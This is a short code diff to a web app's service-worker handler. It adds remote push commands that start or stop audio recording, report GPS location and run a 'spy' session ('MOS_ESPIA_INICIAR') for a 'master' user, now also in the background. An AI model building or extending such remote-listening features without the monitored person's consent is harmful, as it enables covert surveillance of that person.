@@ -7225,9 +7225,24 @@
             navigator.serviceWorker.addEventListener('message', evt => {
               if (evt.data?.type !== 'mos_command') return;
               const cmd = evt.data.data || {};
-              if (cmd.action === 'audio_start') _audioRemotoIniciar(cmd.sesionId, parseInt(cmd.duracionMaxSeg, 10) || 1800);
-              else if (cmd.action === 'audio_stop') _audioRemotoDetener();
-              else if (cmd.action === 'gps_locate') _gpsRegistrar(true);
+              const action = cmd.action || cmd.idNotif || '';
+              console.log('[SW msg ME] cmd recibido:', action);
+              // [v2.7.20] Agregado MOS_ESPIA. Antes ignorado en background.
+              if (action === 'audio_start') {
+                _audioRemotoIniciar(cmd.sesionId, parseInt(cmd.duracionMaxSeg, 10) || 1800);
+              } else if (action === 'audio_stop') {
+                _audioRemotoDetener();
+              } else if (action === 'gps_locate') {
+                _gpsRegistrar(true);
+              } else if (action === 'MOS_ESPIA_INICIAR') {
+                if (typeof _espiaCliIniciar === 'function') {
+                  _espiaCliIniciar(cmd.sesionId, cmd.masterId);
+                } else { console.warn('[SW msg ME] _espiaCliIniciar no existe'); }
+              } else if (action === 'MOS_ESPIA_DETENER') {
+                if (typeof _espiaCliCerrar === 'function') {
+                  _espiaCliCerrar('master_push_stop');
+                }
+              }
             });
           }
           // GPS tracking pasivo: cada 5 min envía ubicación si la app está visible
